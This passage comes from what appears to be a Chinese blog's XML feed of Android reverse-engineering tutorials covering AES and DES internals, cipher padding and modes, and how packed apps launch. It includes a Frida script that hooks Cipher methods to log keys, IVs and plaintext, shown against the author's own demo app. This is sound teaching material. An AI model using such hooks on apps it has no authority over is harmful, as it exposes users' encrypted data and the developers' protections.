<li>轮常量异或：将前两步的结果同轮常量Rcon[j]进行异或，其中j表示轮数</li>
</ol>
<p>轮常量Rcon[j]是一个字，其值见下表</p>
<table>
<thead>
<tr>
<th>j</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
</tr>
</thead>
<tbody><tr>
<td>Rcon[j]</td>
<td>01 00 00 00</td>
<td>02 00 00 00</td>
<td>04 00 00 00</td>
<td>08 00 00 00</td>
<td>10 00 00 00</td>
</tr>
<tr>
<td>j</td>
<td>6</td>
<td>7</td>
<td>8</td>
<td>9</td>
<td>10</td>
</tr>
<tr>
<td>Rcon[j]</td>
<td>20 00 00 00</td>
<td>40 00 00 00</td>
<td>80 00 00 00</td>
<td>1B 00 00 00</td>
<td>36 00 00 00</td>
</tr>
</tbody></table>
<center>轮常量Rcon[j]</center>

<p>总的来说，密钥扩展的复杂性是确保算法安全性的重要部分。当分组长度和密钥长度都是128bit时，AES的加密算法共迭代10轮，每一轮最后要与一个子密钥进行轮密钥加，再加上最开始的一次轮密钥加，即一个分组共需要扩展为11个128bit的轮密钥。AES的密钥扩展算法是以字节为一个基本单位（一个字为4个字节），刚好是密钥矩阵的一列。因此4个字（128bit）密钥需要扩展成11个子密钥，共44个字。</p>
<h2 id="AES-hook"><a href="#AES-hook" class="headerlink" title="AES hook"></a>AES hook</h2><h5 id="对java层的AES进行hook"><a href="#对java层的AES进行hook" class="headerlink" title="对java层的AES进行hook"></a>对java层的AES进行hook</h5><p>编写hook脚本通过参数以及返回值获取到加解密前后以及key的值</p>
<pre><code class="js">package com.xiaoeryu.aes;

import android.os.Build;

import java.io.UnsupportedEncodingException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;

public class AES {
    public static String encrypt(String content, String sKey) throws UnsupportedEncodingException, NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {
        if (sKey == null) {
            System.out.print("Key is null");
            return null;
        }
        // Determine the key length
        if (sKey.length() != 16) {
            System.out.print("Key length is not 16");
            return null;
        }
        byte[] raw = sKey.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding"); // "算法/模式/补码方式"
        cipher.init(Cipher.ENCRYPT_MODE, skeySpec);
        byte[] encrypted = cipher.doFinal(content.getBytes("utf-8"));
        String result = null;
        if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) {
            result = Base64.getEncoder().encodeToString(encrypted);
        } else {
            result = android.util.Base64.encodeToString(encrypted, android.util.Base64.DEFAULT);
        }
        return result;
    }
    public static String decrypt(String content, String sKey) throws UnsupportedEncodingException, NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {
        if (sKey == null) {
            System.out.print("Key is null");
            return null;
        }
        if  (sKey.length() != 16) {
            System.out.print("Key length is not 16");
            return null;
        }
        byte[] raw = sKey.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, skeySpec);
        byte[] encrypted = android.util.Base64.decode(content, android.util.Base64.DEFAULT);
        byte[] original = cipher.doFinal(encrypted);
        String originalString = new String(original, "utf-8");
        return originalString;
    }
}
</code></pre>
<ul>
<li>对java层的AES进行hook跟之前hook DES使用的方法基本都是一样的，区别只是在于它们实现的时候调用的方法不同而已。所以相同的代码更改一下hook的函数和重载就可以了</li>
</ul>
<h5 id="定位SO中的AES算法"><a href="#定位SO中的AES算法" class="headerlink" title="定位SO中的AES算法"></a>定位SO中的AES算法</h5><p>跟之前一样，使用findcrypt插件直接就可以根据S盒定位到算法的位置，如果定位不到可能是因为插件中没有S盒的特征跟上一章同样的方法添加进去即可。</p>
<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/image-20240228231505592.png" class="" title="image-20240228231505592">

<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/image-20240228231548507.png" class="" title="image-20240228231548507">

<ul>
<li>通过交叉引用定位到调用S盒的函数</li>
</ul>
<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/image-20240228231743503.png" class="" title="image-20240228231743503">

<ul>
<li>跟进去分析</li>
</ul>
<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/image-20240228232341555.png" class="" title="image-20240228232341555">

<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/image-20240229113043350.png" class="" title="image-20240229113043350">

<p>跟据汇编代码可知，这里是根据在获取S盒的值</p>
<h6 id="附件："><a href="#附件：" class="headerlink" title="附件："></a>附件：</h6><p>定位SO中AES算法的<a href="https://github.com/xiaoeeyu/native-aes-demo">测试demo</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
        <category>加密解密</category>
      </categories>
      <tags>
        <tag>Frida Hook</tag>
        <tag>AES</tag>
      </tags>
  </entry>
  <entry>
    <title>分组密码的填充及工作模式</title>
    <url>/2024/03/02/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E5%A1%AB%E5%85%85%E5%8F%8A%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>前一章了解了AES的工作模式以及在java中的hook和so中的定位，本章主要来介绍一下分组密码的填充以及工作模式</p>
<p>经过插件、hook等方式分析出是AES或DES之后，接下来就要判断分组密码的<strong>填充和工作模式</strong></p>
<span id="more"></span>

<p>分组密码对每一个固定大小的明文分组进行加密处理。</p>
<p>试想一下：对于给定的任意长度的明文，使用分组密码进行加密时就会遇到哪些问题呢？</p>
<ol>
<li><p>明文长度不够一个分组太小时怎么办</p>
<blockquote>
<p>对不够一个分组大小时，制定一定的标准进行填充，是加密内容的长度到达一个分组大小即可；在解密时按照相同的标准再将填充部分删掉即可；</p>
</blockquote>
</li>
<li><p>需要加密的明文长度太长，超出了一个或者数个甚至更多个分组大小时怎么办</p>
<blockquote>
<p>对需要加密的所有明文进行分片，按照每个片的长度为一个分组进行处理即可，此时，便延伸出IV的概念，以及每一片明文甚至是每一片明文加密得到的密文之间关系的相关概念，即分组密码的工作模式</p>
</blockquote>
</li>
</ol>
<p>对于要加密的明文长度不够一个分组时，需要进行填充。有时，对于恰好已经是一个明文长度的分组也会填充，这时就会填充一个新的分组。</p>
<p>关于密码的验证，我们经常要使用<a href="https://gchq.github.io/CyberChef/">CyberChef</a>这个工具</p>
<img src="/2024/03/02/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E5%A1%AB%E5%85%85%E5%8F%8A%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/image-20240229173042776.png" class="" title="image-20240229173042776">

<h4 id="分组密码的填充"><a href="#分组密码的填充" class="headerlink" title="分组密码的填充"></a>分组密码的填充</h4><h6 id="PKCS5PADDING-x2F-PKCS7PADDING"><a href="#PKCS5PADDING-x2F-PKCS7PADDING" class="headerlink" title="PKCS5PADDING/PKCS7PADDING"></a>PKCS5PADDING/PKCS7PADDING</h6><p>填充至符合块大小的整数倍，填充值为填充数量值</p>
<blockquote>
<p>原始：FF FF FF FF FF FF FF FF FF </p>
<p>填充：FF FF FF FF FF FF FF FF FF O7 07 07 07 07 07 07</p>
</blockquote>
<p>PKCS5PADDING的块大小应为8个字节，而PKCS7PADDING的块大小可以在1~255的范围内。当原始数据正好就是16长度时，因为PKCS#7规定Padding必须存在，因此即使原始数据是16的整数倍，也需要在末尾追加16字节的Padding，即正好追加一个块，这个块每个字节都是0x10</p>
<h6 id="ANSI-X-923"><a href="#ANSI-X-923" class="headerlink" title="ANSI X.923"></a>ANSI X.923</h6><p>ANSI X.923字节填充方式以<strong>00</strong>字节填充并在最后一个字节处定义填充的字节数</p>
<blockquote>
<p>… | DD DD DD DD DD DD DD DD | DD DD DD DD <strong>00 00 00 04</strong> |</p>
</blockquote>
<h6 id="ISO-10126"><a href="#ISO-10126" class="headerlink" title="ISO 10126"></a>ISO 10126</h6><p>ISO 10126规定填充的字节应当是随机数并在最后一个字节处定义填充的字节数</p>
<blockquote>
<p>… | DD DD DD DD DD DD DD DD | DD DD DD DD 81 A6 23 04 |</p>
</blockquote>
<p>等一些其它的方式，网上都可以搜索到就不一一列举。最常见的还是<strong>PKCS5PADDING/PKCS7PADDING</strong>这两种填充方式。</p>
<h4 id="分组密码的工作模式"><a href="#分组密码的工作模式" class="headerlink" title="分组密码的工作模式"></a>分组密码的工作模式</h4><table>
<thead>
<tr>
<th>模式</th>
<th>名称</th>
<th>描述</th>
<th>典型应用</th>
</tr>
</thead>
<tbody><tr>
<td>电子密码本（ECB）</td>
<td>Electronic CodeBook</td>
<td>用相同的密钥分别对明文分组独立加密</td>
<td>单个数据的安全传输（例如一个加密密钥）</td>
</tr>
<tr>
<td>密码分组链接（CBC）</td>
<td>Cipher Block Chaining</td>
<td>加密算法的输入是上一个密文组和下一个明文组的异或</td>
<td>面向分组的通用传输或者认证</td>
</tr>
<tr>
<td>密文反馈（CFB）</td>
<td>Cipher FeedBack</td>
<td>一次处理s位，上一块密文作为加密算法的输入，产生的伪随机数输出与明文异或作为下一个单元的密文</td>
<td>面向分组的通用传输或者认证</td>
</tr>
<tr>
<td>输出反馈（OFB）</td>
<td>Output FeedBack</td>
<td>与CFB类似，只是加密算法的输入是上一次加密的输出，并且使用整个分组</td>
<td>噪声信道上的数据流的传输（如卫星通信）</td>
</tr>
<tr>
<td>计数器（CTR）</td>
<td>Counter</td>
<td>每个明文分组都与一个经过加密的计数器相异或。对每个后续分组计数器递增</td>
<td>面向分组的通用传输或者用于高速需求</td>
</tr>
</tbody></table>
<img src="/2024/03/02/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E5%A1%AB%E5%85%85%E5%8F%8A%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/image-20240301214534644.png" class="" title="image-20240301214534644">

<center>ECB加密模式</center>

<ul>
<li>ECB加密模式可以直接并行计算，效率比较高。但是相同的明文加密后必然是相同的密文。</li>
</ul>
<img src="/2024/03/02/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E5%A1%AB%E5%85%85%E5%8F%8A%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/image-20240301214320310.png" class="" title="image-20240301214320310">

<center>CBC加密模式</center>

<ul>
<li>每一块加密都要依赖上一块的密文结果，所以效率较低。但是不会有相同的明文加密结果就是相同的密文的情况。</li>
</ul>
<img src="/2024/03/02/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E5%A1%AB%E5%85%85%E5%8F%8A%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/image-20240301214944732.png" class="" title="image-20240301214944732">

<center>OFB加密模式</center>

<ul>
<li>等于是将分组加密转换为了流加密，算法根据给定的向量IV经过加密器处理之后生成key（秘钥序列），加密的时候只需要将秘钥序列中的秘钥，同明文块进行异或就可以了</li>
</ul>
<img src="/2024/03/02/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E5%A1%AB%E5%85%85%E5%8F%8A%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/image-20240301215827196.png" class="" title="image-20240301215827196">

<center>CFB加密模式，又称密码反馈模式</center>

<ul>
<li>这个跟OFB的区别在于只有第一次得到的K是通过向量IV加密得到的，后续的K是通过对前一段明文加密后的密文块得到的。有点像是OFB和CBC的一种结合体</li>
</ul>
<img src="/2024/03/02/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E5%A1%AB%E5%85%85%E5%8F%8A%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/image-20240301220401452.png" class="" title="image-20240301220401452">

<center>CTR加密模式：可转为流密码，可并行</center>

<ul>
<li>举个例子：比如128位的AES。首先选择一个IV，长度小于分组长度（比如96位）。而剩下的32位则由计数器使用，并且该计数器的CTR值初始化为0.在会话期间加密的每个分组，计数器都会递增而IV则保持不变。在本例中，在不更换IV的情况下可加密的最大分组个数为2^32^。由于每个分组长度都是16个字节，所以在生成一个新的IV前，可以加密的最大数据大小为16x2^32^ = 2^36^字节，大概为64G字节。该模式最大优点就是可并行计算，大大提高效率。</li>
</ul>
<p>还有另外一种是：迦罗瓦计数器模式（GCM）</p>
<p>跟之前不同的是，上述5种分组密码的工作模式如ECB、CBC、OFB、CFB、CTR都仅仅提供了机密性；为了保证加密信息没有被意外修改或恶意篡改，需要采用分离的信息验证码，例如CBC-MAC等。在发现将认证模式与加密模式联合起来的难度之后，密码学社区开始研究结合了加密和认证的单一模式，这种模式被成为认证加密模式（Authenticated Encrypthon / AE / authenc）。AE模式的例子包括GCM[10]、GCM[11]、CWC 、EAX、IAPM和OCB。</p>
]]></content>
      <categories>
        <category>Android逆向</category>
        <category>加密解密</category>
      </categories>
      <tags>
        <tag>分组密码</tag>
      </tags>
  </entry>
  <entry>
    <title>分组密码-DES</title>
    <url>/2024/02/23/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-DES/</url>
    <content><![CDATA[<p>本章内容主要是DES加密的原理和如何在Java以及SO中识别DES算法</p>
<span id="more"></span>

<p>DES：DES算法为密码体制中的对称密码体制，属于分组密码，又被称为美国数据加密标准，是1972年美国IBM公司研制的对称密码体制加密算法。明文按64位进行分组，密钥长64位，而事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位，使得每个密钥都有奇数个1）分组后的明文组和56位的密钥按位替代或交换的方法形成密文组的加密方法。</p>
<p>DES（数据加密标准）算法主要采用替换和移位的方式进行加密，他用56位（64位密钥只有56位有效）对64位二进制数据块进行加密，每次加密对64位的输入数据进行16轮编码，经过一系列替换和移位后，输入的64位原数据转换成完全不同的64位输出数据。DES作为分组密码，主要的实现过程由两部分组成，分别是密钥的生成以及明文的处理。其中每一个分组的明文的处理分为16轮进行，而对于每一轮都需要使用密钥编排部分生成的子密钥参与运算。</p>
<h3 id="java代码中使用的DES"><a href="#java代码中使用的DES" class="headerlink" title="java代码中使用的DES"></a>java代码中使用的DES</h3><p>Android本身提供了用于加解密的类：javax.crypto.Cipher类，直接使用即可，其中的DES代表使用DES加密算法，CBC代表分组加密的工作模式，PKCS5Padding代表分组的填充方式；在家解密的过程中，主要的密钥和IV是在Cipher类中的init函数进行传递的，因此，只需要hook该函数即可获取到密钥和IV；</p>
<img src="/2024/02/23/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-DES/image-20240222105933997.png" class="" title="image-20240222105933997">

<ul>
<li><p>在逆向过程中需要定位算法的时候，可以直接搜索“DES”、“Cipher”来定位到算法位置。但是如果代码使用了混淆、加壳、采用反射的方式（例如上图中注释的一行代码）调用Cipher的时候，我们使用静态的方式就无法直接定位到这些关键字符串所在的位置了。</p>
</li>
<li><p>在这种情况下，对于Java实现的情况下我们可以使用xpose、frida去动态的hook关键函数，获取它的参数来拿到需要的内容</p>
<blockquote>
<p>例如：</p>
<p>hook**Cipher.getInstance()**可以获取到加密模式和填充模式</p>
<p>hook <strong>IvParameterSpec()<strong>拿到返回值可以获取到</strong>iv</strong>，</p>
<p>hook **cipher.init()**可以拿到密钥key</p>
</blockquote>
<p>对于Java部分来说，hook起来是相对比较容易的。困难的地方在于复杂的标准DES实现部分</p>
</li>
</ul>
<h4 id="复杂的标准DES实现部分"><a href="#复杂的标准DES实现部分" class="headerlink" title="复杂的标准DES实现部分"></a>复杂的标准DES实现部分</h4><img src="/2024/02/23/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-DES/image-20240222133719348.png" class="" title="image-20240222133719348">

<p>可以看到这个算法还是相对来说比较复杂的</p>
<p>在DES中去快速的识别确认是否是这个算法，有一个简单的办法是去定位DES加密流程中出现的一些常量表</p>
<h5 id="明文处理流程中的常量表"><a href="#明文处理流程中的常量表" class="headerlink" title="明文处理流程中的常量表"></a>明文处理流程中的常量表</h5><p>在针对每一个明文分组即64位数据进行处理的流程中，需要有大量的常量表的参与，从而完成对明文的混淆、扩散处理。主要有：<strong>初始置换IP（8 × 8）</strong>，以及与之对应的<strong>逆初始置换表（8 × 8）</strong>；同时，还有在f函数中的<strong>扩展置换E表（8 × 6）</strong>，用于将32位的输入，扩展成48位；加下来还有<strong>S-盒</strong>的参与，共计有<strong>8个S-盒（4 × 16）</strong>。这些常量都是快速判断DES加密算法的标志。</p>
<img src="/2024/02/23/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-DES/image-20240222144900177.png" class="" title="image-20240222144900177">

<h5 id="密钥编排流程中的常量表"><a href="#密钥编排流程中的常量表" class="headerlink" title="密钥编排流程中的常量表"></a>密钥编排流程中的常量表</h5><p>在针对每一个明文分组即64位数据进行16轮的处理过程中每一轮都需要一个由原始56位密钥经过编排生成的48位子密钥的参与，该密钥编排流程中也同样出现了一些常量表的参与。主要有：初始置换PC-1表（7 × 8），以及PC-2表（6 × 8），这些常量也可以作为快速判断DES加密算法的标志。</p>
<img src="/2024/02/23/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-DES/image-20240222150228405.png" class="" title="image-20240222150228405">

<h5 id="DES的衍生算法"><a href="#DES的衍生算法" class="headerlink" title="DES的衍生算法"></a>DES的衍生算法</h5><p>因为DES到了现如今仅仅56位的加密算法已经不足以确保安全性了，所以衍生出来双重和三重DES</p>
<h6 id="衍生"><a href="#衍生" class="headerlink" title="衍生"></a>衍生</h6><p>在 DES 的基础上，衍生了以下两种加密方式</p>
<ul>
<li>双重 DES</li>
<li>三种 DES</li>
</ul>
<h6 id="双重-DES"><a href="#双重-DES" class="headerlink" title="双重 DES"></a>双重 DES</h6><p>双重 DES 使用两个密钥，长度为 112 比特。加密方式如下</p>
<p>C=Ek2(Ek1(P))</p>
<p><strong>但是双重 DES 不能抵抗中间相遇攻击，我们可以构造如下两个集合</strong></p>
<p>I=Ek1(P)</p>
<p>J=Dk2(C)</p>
<p>即分别枚举 K1 和 K2 分别对 P 进行加密和对 C 进行解密。</p>
<p>在我们对 P 进行加密完毕后，可以对加密结果进行排序，这样的复杂度为2nlog(2n)=O(n2n)2</p>
<p>当我们对 C 进行解密时，可以每解密一个，就去对应的表中查询。</p>
<p>总的复杂度为还是O(n2n)</p>
<h6 id="三重-DES"><a href="#三重-DES" class="headerlink" title="三重 DES"></a>三重 DES</h6><p>三重 DES 的加解密方式如下</p>
<p>C=Ek3(Dk2(Ek1(P)))</p>
<p>P=Dk1(Ek2(Dk3(C)))</p>
<p>在选择密钥时，可以有两种方法</p>
<ul>
<li>3 个不同的密钥，k1，k2，k3 互相独立，一共 168 比特。</li>
<li>2 个不同的密钥，k1 与 k2 独立，k3=k1，112 比特。</li>
</ul>
<h5 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h5><ul>
<li>差分攻击</li>
<li>线性攻击</li>
</ul>
<h3 id="实际的逆向分析"><a href="#实际的逆向分析" class="headerlink" title="实际的逆向分析"></a>实际的逆向分析</h3><p>这里使用我们本地编写的一个标准DES加密作为例子进行分析，<a href="https://github.com/xiaoeeyu/desencrypt">代码地址</a></p>
<h4 id="Java层"><a href="#Java层" class="headerlink" title="Java层"></a>Java层</h4><p>java的静态分析：如果没有加保护的话，只需检索关键字字符串即可</p>
<p>对于使用了字符串加密，函数的调用使用了反射的方式，这种情况使用xposed、frida去hook相关的函数就可以了</p>
<pre><code class="js">function main(){
    Java.perform(function(){
        Java.use('javax.crypto.Cipher').getInstance.overload('java.lang.String').implementation = function(arg0){
            console.log('javax.crypto.Cipher.getInstance is called!', arg0);
            var result = this.getInstance(arg0);
            return result;
        };
        // cipher.init(Cipher.ENCRYPT_MODE, getRawKey(key), iv);
        Java.use('javax.crypto.Cipher').init.overload('int', 'java.security.Key', 'java.security.spec.AlgorithmParameterSpec').implementation = function(arg0, arg1, arg2){
            // console.log("javax.crypto.Cipher.init is called!", arg0, arg1, arg2);
            var mode = arg0;
            var key = arg1;
            var iv = arg2;
            var KeyClass = Java.use('java.security.Key');
            var keyobj = Java.cast(key, KeyClass);
            var key_bytes = keyobj.getEncoded();
            var IVClass = Java.use('javax.crypto.spec.IvParameterSpec');
            var ivobj = Java.cast(iv, IVClass);
            var iv_bytes = ivobj.getIV();
            console.log("javax.crypto.Cipher.init is called!", mode, JSON.stringify(key_bytes), JSON.stringify(iv_bytes));
            var result = this.init(arg0, arg1, arg2);
            return result;
        };
        // doFinal
        Java.use('javax.crypto.Cipher').doFinal.overload('[B').implementation = function(arg0){
            console.log("javax.crypto.Cipher.doFinal is called!", JSON.stringify(arg0));
            var data = arg0;
            var result = this.doFinal(arg0);
            console.log("javax.crypto.Cipher.doFinal is called!", JSON.stringify(data), "encrypt: ", JSON.stringify(result));
            return result;
        };
    })
}

setImmediate(main);
</code></pre>
<ul>
<li>代码非常简单，就是通过frida hook把这几个函数的参数以及**doFinal()**返回的加密后内容打印出来打印出来</li>
</ul>
<img src="/2024/02/23/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-DES/image-20240222220947583.png" class="" title="image-20240222220947583">

<ul>
<li>通过hook打印出了加密和填充模式、密钥Key、加密前的字符串、加密后的字符串</li>
</ul>
<p>通过上面的实践可以知道，在java代码中去识别和获取到算法的内容是比较简单的，只需要去hook就ok了</p>
<h4 id="在SO当中去识别DES"><a href="#在SO当中去识别DES" class="headerlink" title="在SO当中去识别DES"></a>在SO当中去识别DES</h4><p>这里拿我们本地编译的未加保护的标准DES当作例子，用ida分析它的so文件</p>
<h5 id="手动定位DES算法"><a href="#手动定位DES算法" class="headerlink" title="手动定位DES算法"></a>手动定位DES算法</h5><p>例如这里我们可以直接在IDA搜索S盒中的16进制数字来定位</p>
<img src="/2024/02/23/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-DES/image-20240223100117244.png" class="" title="image-20240223100117244">

<ul>
<li>在ida中<strong>alt+B</strong>可以直接搜索S盒的16进制数字，然后通过这个地址的交叉引用定位到算法所在的位置</li>
</ul>
<img src="/2024/02/23/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-DES/image-20240223131756282.png" class="" title="image-20240223131756282">

<p>或者，我们也可以通过使用<strong>findcrypt插件</strong>定位到算法位置</p>
<h5 id="findcrypt插件定位算法"><a href="#findcrypt插件定位算法" class="headerlink" title="findcrypt插件定位算法"></a>findcrypt插件定位算法</h5><p>在使用插件快捷键<strong>ctrl+alt+F</strong>定位的时候发现无法定位到我们的算法位置，因为插件是按特征去识别算法来定位的，手动把算法的特征添加进去。</p>
<p>在ida的<strong>\plugins</strong>目录下找到<strong>findcrypt3.rules</strong>添加规则特征：将S盒处的16进制特征添加进去就可以了</p>
<img src="/2024/02/23/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-DES/image-20240223150139614.png" class="" title="image-20240223150139614">

<p>然后重新识别就可以识别到算法位置</p>
<img src="/2024/02/23/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-DES/image-20240223150320804.png" class="" title="image-20240223150320804">

<img src="/2024/02/23/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-DES/image-20240223150755250.png" class="" title="image-20240223150755250">

<p>需要的话可以把P表、扩展置换表的特征都添加进去。跟添加S盒的方法是相同的。</p>
]]></content>
      <categories>
        <category>Android逆向</category>
        <category>加密解密</category>
      </categories>
      <tags>
        <tag>Frida Hook</tag>
        <tag>DES</tag>
      </tags>
  </entry>
  <entry>
    <title>加壳APP运行流程和ClassLoader修正</title>
    <url>/2023/08/24/%E5%8A%A0%E5%A3%B3APP%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%92%8CClassLoader%E4%BF%AE%E6%AD%A3/</url>
    <content><![CDATA[<p>本章内容主要基于分析Android 8.0源码，来学习APP的启动流程和APP加壳原理以及运行流程，以及写代码怎么去从sd卡加载其它dex中的Activity，不涉及加密解密的操作。</p>
<span id="more"></span>



<h3 id="app启动流程"><a href="#app启动流程" class="headerlink" title="app启动流程"></a>app启动流程</h3><img src="/2023/08/24/%E5%8A%A0%E5%A3%B3APP%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%92%8CClassLoader%E4%BF%AE%E6%AD%A3/image-20230824173255564.png" class="" title="image-20230824173255564">

<ul>
<li>通过Zygote进程最终进入到app进程的世界，ActivityThread.main()是进入app进程世界的大门。只有通过这个函数之后，我们才进入到一个加壳app自己的代码当中。</li>
</ul>
<p><strong>源码网址：</strong></p>
<ul>
<li><a href="http://androidxref.com/">国外</a></li>
<li><a href="http://aospxref.com/">国内</a></li>
</ul>
<h4 id="ActivityThread的源代码"><a href="#ActivityThread的源代码" class="headerlink" title="ActivityThread的源代码"></a>ActivityThread的源代码</h4><p>ActivityThread的源代码在frameworks当中</p>
<img src="/2023/08/24/%E5%8A%A0%E5%A3%B3APP%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%92%8CClassLoader%E4%BF%AE%E6%AD%A3/image-20230824174127453.png" class="" title="image-20230824174127453">

<ul>
<li><p>通过Zygote进程最终进入到APP进程的世界，ActivityThread.main()是进入app进程世界的大门。只有通过这个函数之后，我们才进入到一个加壳app自己的代码当中。ActivityThread还有一个静态函数currentActivityThread那我们就可以通过它来获取到进程当中的ActivityThread实例进而获取到Activity当中的一些很重要的变量。</p>
<img src="/2023/08/24/%E5%8A%A0%E5%A3%B3APP%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%92%8CClassLoader%E4%BF%AE%E6%AD%A3/image-20230824175216003.png" class="" title="image-20230824175216003">
</li>
<li><p>对于ActivityThread这个类，其中的sCurrentActivityThread静态变量用于全局保存创建的ActivityThread实例,</p>
<pre><code class="java">javaprivate static volatile ActivityThread sCurrentActivityThread;
</code></pre>
<p>同时还提供了<code>public static ActivityThread currentActivityThread()</code>这个静态函数用于获取当前虚拟机创建的ActivityThread实例。ActivityThread.main()函数是java中app启动的入口main()函数，这里会启动主消息循环，并创建ActivityThread实例，之后调用thread.attach(false)完成一系列初始化准备工作，并完成全局静态变量sCurrentActivityThread的初始化。</p>
<pre><code class="java">private void attach(boolean system) {
    sCurrentActivityThread = this;
    ...
}

--------------------------------------------------

public static void main(String[] args) {
    ...
    // 创建Looper对象，创建MessageQueue对象
    Looper.prepareMainLooper();

    // 创建自己的ActivityThread对象
    ActivityThread thread = new ActivityThread();
    thread.attach(false);

    if (sMainThreadHandler == null) {
        sMainThreadHandler = thread.getHandler();
    }

    if (false) {
        Looper.myLooper().setMessageLogging(new
                LogPrinter(Log.DEBUG, "ActivityThread"));
    }

    // End of event ActivityThreadMain.
    Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);
    Looper.loop();

    throw new RuntimeException("Main thread loop unexpectedly exited");
}
</code></pre>
<p>之后主线进程进入消息循环，等待接收来自系统的消息。当收到系统发送来的bindapplication的进程间调用时，调用函数handlebindapplication来处理该请求</p>
<pre><code class="java">public void handleMessage(Message msg) {
    
    ...
    // 处理bindApplication调用
    case BIND_APPLICATION:
    Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, "bindApplication");
    AppBindData data = (AppBindData)msg.obj;
    handleBindApplication(data);
    Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);
    
    ...
        
}
-------------------------------------------------------------
// 定义不可修改&amp;继承的LoadedApk对象    
public final LoadedApk getPackageInfoNoCheck(ApplicationInfo ai,
    CompatibilityInfo compatInfo) {
    return getPackageInfo(ai, compatInfo, null, false, true, false);
}

-------------------------------------------------------------
private void handleBindApplication(AppBindData data) {
    //step 1: 创建LoadedApk对象
    data.info = getPackageInfoNoCheck(data.appInfo, data.compatInfo);
    ...
    //step 2: 创建ContextImpl对象;
    final ContextImpl appContext = ContextImpl.createAppContext(this, data.info);
 
    //step 3: 创建Instrumentation
    mInstrumentation = new Instrumentation();
 
    //step 4: 创建Application对象;在makeApplication函数中调用了newApplication，在该函数中又调用了app.attach(context)，在attach函数中调用了Application.attachBaseContext函数
    Application app = data.info.makeApplication(data.restrictedBackupMode, null);
    mInitialApplication = app;
 
    //step 5: 安装providers
    List&lt;ProviderInfo&gt; providers = data.providers;
    installContentProviders(app, providers);
 
    //step 6: 执行Application.Create回调
    mInstrumentation.callApplicationOnCreate(app);
</code></pre>
<p>在handleBindApplication函数中第一次进入了app的代码世界，该函数功能启动一个application，并把系统收集到的apk组件等相关信息绑定到application里，在创建完application对象后，接着调用了application的attachBaseContext方法，之后调用了application的onCreate函数。由此可以发现，<strong>app的Application类中的attachBaseContext和onCreate这两个函数是最先获取执行权进行代码执行的。这也是为什么各家的加固工具的主要逻辑都是通过替换app入口Application，并亲自实现这两个函数</strong>，在这两个函数中进行代码的脱壳以及执行权交付的原因。</p>
</li>
</ul>
<h3 id="APP加壳原理以及运行流程"><a href="#APP加壳原理以及运行流程" class="headerlink" title="APP加壳原理以及运行流程"></a>APP加壳原理以及运行流程</h3><p>从前面的分析可以得出一个结论，app最先获得执行权限的是app中声明的Application类中的attachBaseContext和onCreate函数。因此，壳想要完成应用中加固代码的解密以及应用执行权的交付就都是在这两个函数上做文章。下图大致讲了加壳应用的运行流程。</p>
